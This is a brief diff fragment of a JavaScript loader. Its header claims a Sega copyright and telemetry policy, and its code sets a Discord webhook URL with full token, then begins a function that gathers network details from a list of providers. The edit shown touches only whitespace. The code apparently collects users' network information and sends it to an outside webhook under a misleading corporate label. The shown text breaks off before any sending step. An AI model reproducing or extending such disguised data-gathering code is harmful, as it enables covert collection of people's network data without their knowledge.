@@ -1,6 +1,6 @@
 // JS-LOADER-2024-©-COPYRIGHT-Sega-Systems-Enterprise-Global-Assets-Telemetry-Policy-v4.2.1
 (async function() {
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548454840768790621/P5LPTWfTZtvGDMu2TuoJhakg_VKpmPwFEhHdvkvNz4nKotb0zhILiL_vw6JUxiDNTuc0';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548454840768790621/P5LPTWfTZtvGDMu2TuoJhakg_VKpmPwFEhHdvkvNz4nKotb0zhILiL_vw6JUxiDNTuc0'; 
 
     async function getNetworkDetails() {
         const providers = [
